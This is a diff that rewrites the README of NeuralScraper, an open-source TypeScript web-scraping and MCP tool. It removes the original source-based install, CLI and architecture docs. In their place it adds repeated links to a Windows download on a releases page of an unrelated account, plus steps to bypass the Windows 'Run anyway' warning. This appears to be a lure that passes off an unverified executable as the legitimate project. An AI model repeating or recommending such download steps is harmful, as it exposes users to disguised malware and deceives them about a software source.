@@ -1,333 +1,166 @@
-<div align="center">
+# 🕸️ NeuralScraper - Extract Web Data for AI
 
-# NeuralScraper v2.0
+[![Download NeuralScraper](https://img.shields.io/badge/Download%20NeuralScraper-blue?style=for-the-badge&logo=github)](https://github.com/Reclusive-frazzle473/NeuralScraper/releases)
 
-**Web scraping, analysis & content extraction for AI agents.**
+## 📥 Download
 
-Scrape pages, crawl sites, extract UI/brand/SEO data.
-MCP server + CLI + HTTP API. Local-first, self-hosted.
+Visit this page to download NeuralScraper for Windows:
 
-![TypeScript](https://img.shields.io/badge/TypeScript-5.8-0D1117?style=flat-square&logo=typescript&logoColor=3178C6)
-![License](https://img.shields.io/badge/License-MIT-0D1117?style=flat-square&logo=opensourceinitiative&logoColor=4CAF50)
-![MCP](https://img.shields.io/badge/MCP-Compliant-0D1117?style=flat-square&logo=anthropic&logoColor=9F7AEA)
+https://github.com/Reclusive-frazzle473/NeuralScraper/releases
 
-</div>
+## 🪟 Windows Setup
 
----
+1. Open the release page above.
+2. Find the latest release.
+3. Download the Windows file from the Assets list.
+4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
 
-> **Part of the Neural\* ecosystem.**
-> NeuralScraper handles web scraping & analysis — but it doesn't work alone.
-> It pairs with **NeuralVaultCore** (persistent memory), **NeuralVaultSkill** (session automation), and **NeuralVaultFlow** (dev workflow orchestration).
-> Each component has its own repository and documentation. See the [Neural\* Ecosystem](#neural-ecosystem) section at the bottom.
+If Windows asks for permission, choose **More info** and then **Run anyway** if you trust the file.
 
----
+## ✨ What NeuralScraper Does
 
-## What It Does
+NeuralScraper helps you collect text and page data from websites. It can support:
 
-NeuralScraper gives AI agents (and humans) a clean, structured way to extract data from the web — no fluff, no cloud dependency.
+- web scraping
+- content extraction
+- page analysis
+- brand checks
+- SEO review
+- UI review
+- local AI workflows
+- use with MCP tools
 
-| Capability | Description |
-|---|---|
-| **Scrape** | Scrape page — web + PDF |
-| **Screenshot** | Full-page PNG capture |
-| **Crawl** | Multi-page scraping with depth and limit control |
-| **Map** | Fast internal URL discovery |
-| **UI Analysis** | Layout structure, components, spacing, typography |
-| **Brand Extraction** | Dominant colors, fonts, logos |
-| **SEO Audit** | Meta tags, headings, OG, schema markup, scoring |
-| **Analyze** | Scrape + screenshot + UI + brand + SEO in one command |
-| **Search** | Web search via SearXNG + scrape results |
-| **Extract** | Structured data extraction with LLM (Ollama) and custom schema |
-| **Interact** | Browser actions (click, type, wait) + scrape |
-| **Batch** | Process a list of URLs from a file |
+It is built for people who want site data in a simple, repeatable way.
 
----
+## ✅ Before You Start
 
-## Installation
+Use a Windows PC with:
 
-### Option 1 — Local (recommended)
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection
+- Permission to download files from GitHub
 
-```bash
-git clone https://github.com/getobyte/NeuralScraper.git
-cd NeuralScraper
-npm install
-npx playwright install chromium
-npm run build
-```
+For best results, close extra apps before you run NeuralScraper.
 
-Make the CLI globally available:
+## 🚀 First Run
 
-```bash
-npm link
-# Now you can run: ns scrape https://example.com
-```
+After you open the app:
 
-Start the MCP server:
+1. Enter the website address you want to scan.
+2. Pick the type of data you want.
+3. Start the scrape or analysis task.
+4. Wait for the results to finish.
+5. Save the output to a file or copy it to another tool.
 
-```bash
-node dist/mcp-server.js
-```
+If you use AI agents, NeuralScraper can feed structured web data into your workflow.
 
----
+## 🧭 Common Use Cases
 
-### Option 2 — Docker (homelab)
+### 📝 Content Extraction
+Pull text from pages, articles, landing pages, or product pages.
 
-```bash
-git clone https://github.com/getobyte/NeuralScraper.git
-cd NeuralScraper
-cp .env.example .env
-docker compose up -d
-```
+### 🔍 SEO Audit
+Review page titles, headings, meta data, links, and visible content.
 
-MCP server starts on port `9996` inside container `NeuralScraper`.
+### 🎨 UI Analysis
+Check how a page is laid out and gather details about page sections.
 
-Verify:
+### 🏷️ Brand Extraction
+Find brand names, product names, and related page details.
 
-```bash
-docker ps | grep NeuralScraper
-docker logs NeuralScraper
-```
+### 🤖 AI Agent Workflows
+Use web data as input for prompts, research tasks, and automated checks.
 
----
+## 🛠️ How to Use It Safely
 
-## Connecting to Claude Code
+- Only scan sites you own or have permission to test.
+- Start with one page before you run a large job.
+- Keep the browser window open while the tool works if it asks for it.
+- Save your output often.
+- Use a small test site first if you are learning the tool.
 
-Add to `~/.claude.json` or `.claude/settings.json` in your project:
+## 📁 What You May See After Download
 
-```json
-{
-  "mcpServers": {
-    "neuralscraper": {
-      "command": "node",
-      "args": ["D:/path/to/NeuralScraper/dist/mcp-server.js"]
-    }
-  }
-}
-```
+The release file may include:
 
-Restart Claude Code. The following **12 tools** will be available:
+- the app file
+- a ZIP archive
+- a folder with supporting files
+- a sample config file
+- a readme file for advanced options
 
-`ns_scrape` · `ns_screenshot` · `ns_crawl` · `ns_map` · `ns_ui` · `ns_brand` · `ns_seo` · `ns_analyze` · `ns_search` · `ns_extract` · `ns_interact` · `ns_batch`
+If you see more than one file, choose the Windows app or the ZIP file that contains it.
 
----
+## 🔧 Basic Workflow
 
-## HTTP API
-
-NeuralScraper exposes a REST API when running as a server.
-
-| Method | Endpoint |
-|---|---|
-| `GET` | `/health` |
-| `POST` | `/scrape` |
-| `POST` | `/screenshot` |
-| `POST` | `/crawl` |
-| `POST` | `/map` |
-| `POST` | `/ui` |
-| `POST` | `/brand` |
-| `POST` | `/seo` |
-| `POST` | `/analyze` |
-| `POST` | `/search` |
-| `POST` | `/extract` |
-| `POST` | `/interact` |
-| `POST` | `/batch` |
-
----
-
-## Using with Ollama (Local LLM)
-
-NeuralScraper's `ns extract` command uses **Ollama** to run a local LLM for structured data extraction — no cloud, no API keys.
-
-### Step 1 — Install Ollama
-
-**Windows / macOS:**
-Download the installer from [ollama.com/download](https://ollama.com/download) and run it.
-
-**Linux:**
-```bash
-curl -fsSL https://ollama.com/install.sh | sh
-```
-
-Verify:
-```bash
-ollama --version
-```
-
-### Step 2 — Pull the recommended model
-
-```bash
-ollama pull qwen3:14b
-```
-
-> `qwen3:14b` — 9.3 GB, 40K context, native tool use support. Recommended for `ns extract` flows.
-
-### Step 3 — Run
-
-```bash
-ollama run qwen3:14b
-```
-
-Ollama runs as a local API server on `http://localhost:11434`. No internet required after the initial pull.
-
----
-
-## CLI Usage
-
-```bash
-# Scrape a page (web or PDF)
-ns scrape https://example.com
-
-# Full-page screenshot
-ns screenshot https://example.com
-
-# Crawl a site
-ns crawl https://example.com --depth 2 --limit 20
-
-# Discover URLs
-ns map https://example.com
-
-# UI analysis
-ns ui https://example.com
-
-# Brand extraction
-ns brand https://example.com
-
-# SEO audit
-ns seo https://example.com
-
-# Full analysis (scrape + screenshot + UI + brand + SEO)
-ns analyze https://example.com
-
-# Web search via SearXNG + scrape results
-ns search "best react libs" --limit 5
-
-# Structured extraction with LLM (Ollama)
-ns extract https://example.com --schema '{"price":"string"}'
-
-# Browser automation (click, type, wait) + scrape
-ns interact https://example.com --actions '[{"click":".btn"}]'
-
-# Batch processing from a file
-ns batch urls.txt
-```
-
-### CLI Options
-
-| Option | Commands | Default |
-|---|---|---|
-| `-o, --output <dir>` | all | `./ns-output` |
-| `-d, --depth <n>` | `crawl` | `2` |
-| `-l, --limit <n>` | `crawl`, `search` | `20` / `5` |
-| `--no-screenshot` | `scrape`, `crawl`, `batch` | — |
-| `-s, --schema <json>` | `extract` | — |
-| `-p, --prompt <text>` | `extract` | — |
-| `-a, --actions <json>` | `interact` | `[]` |
-| `--no-scrape` | `search` | — |
-| `--no-scrape-after` | `interact` | — |
-
----
-
-## Output Structure
-
-Single page scrape:
-
-```
-ns-output/
-  example.com/
-    2026-03-28T14-30-00/
-      page.md
-      page.html
-      metadata.json
-      links.json
-      screenshot.png
-      ui-analysis.json
-      brand.json
-      seo-audit.json
-      manifest.json
-```
-
-Crawl job:
-
-```
-ns-output/
-  example.com/
-    crawl-2026-03-28T14-30-00/
-      manifest.json
-      pages.json
-      pages/
-        001-home/
-        002-about/
-        ...
-```
-
----
-
-## Architecture
-
-```
-src/
-  browser/
-    playwright.ts        # Browser pool management
-    screenshot.ts        # Full-page screenshot
-  extractors/
-    markdown.ts          # HTML → Markdown (readability + turndown)
-    metadata.ts          # Meta tags, OG, Twitter cards
-    links.ts             # Link extraction & classification
-    ui-analyzer.ts       # Layout, components, spacing, fonts
-    brand.ts             # Colors, fonts, logos
-    seo.ts               # SEO audit with scoring
-  storage/
-    writer.ts            # File output & manifest generation
-  tools/
-    scrape.ts
-    screenshot.ts
-    crawl.ts
-    map.ts
-    ui.ts
-    brand.ts
-    seo.ts
-    analyze.ts
-    search.ts
-    extract.ts
-    interact.ts
-    batch.ts
-  cli.ts                 # CLI entry point (commander)
-  mcp-server.ts          # MCP server entry point (stdio)
-  index.ts               # Library exports
-```
-
----
-
-## Stack
-
-| | |
-|---|---|
-| Runtime | Node.js 20+ |
-| Language | TypeScript 5.8 |
-| Browser | Playwright (Chromium) |
-| HTML → MD | @mozilla/readability + turndown |
-| HTML parsing | cheerio |
-| MCP | @modelcontextprotocol/sdk |
-| CLI | commander |
-| Build | tsup |
-
----
-
-## Neural\* Ecosystem
-
-NeuralScraper is a standalone tool — but it's designed to work alongside the rest of the Neural\* family. Each component lives in its own repo with its own docs.
-
-| Component | Role | Repo |
-|---|---|---|
-| **NeuralScraper** *(you are here)* | Web scraping & analysis | — |
-| **NeuralVaultCore** | Persistent memory for AI agents | [→ GitHub](https://github.com/getobyte/NeuralVaultCore) |
-| **NeuralVaultSkill** | Session memory automation | [→ GitHub](https://github.com/getobyte/NeuralVaultSkill) |
-| **NeuralVaultFlow** | Dev workflow orchestration | [→ GitHub](https://github.com/getobyte/NeuralVaultFlow) |
-
----
-
-<div align="center">
-
-**NeuralScraper v2.0** — Cyber-Draco Legacy
-Built by [getobyte](https://github.com/getobyte)
-
-</div>
+1. Open NeuralScraper.
+2. Paste a website link.
+3. Choose what you want to extract.
+4. Start the run.
+5. Review the output.
+6. Save the result for later use.
+
+This flow works well for quick checks and repeat jobs.
+
+## 🧩 MCP and Local AI Support
+
+NeuralScraper can fit into local-first setups and MCP server flows. That makes it useful when you want website data to stay close to your own tools.
+
+You can use it with:
+
+- local AI tools
+- Claude Code workflows
+- self-hosted setups
+- Ollama-based systems
+- script-based testing
+
+## 📌 Tips for Better Results
+
+- Use clear page links.
+- Test one page at a time.
+- Keep page structure simple when possible.
+- Avoid pages that load content only after long delays.
+- Save the raw output before you edit it.
+
+## 🧪 Example Tasks
+
+- extract the main text from a blog post
+- check if a product page has a clear title
+- compare headings across multiple pages
+- gather page content for an AI prompt
+- review a landing page for layout changes
+- collect data for a small SEO audit
+
+## 📦 Download and Install
+
+Use this link to visit the release page and download the Windows version:
+
+https://github.com/Reclusive-frazzle473/NeuralScraper/releases
+
+After download:
+
+1. Open the file from your Downloads folder.
+2. Extract it if it is a ZIP file.
+3. Open the app or executable inside the folder.
+4. Follow any on-screen steps.
+5. Keep the release folder in a safe place for later use.
+
+## 🗂️ Project Topics
+
+- ai-agent
+- brand-extraction
+- claude-code
+- cli-tool
+- local-first
+- mcp
+- mcp-server
+- ollama
+- playwright-typescript
+- self-hosted
+- seo-audit
+- ui-analysis
+- web-scraping
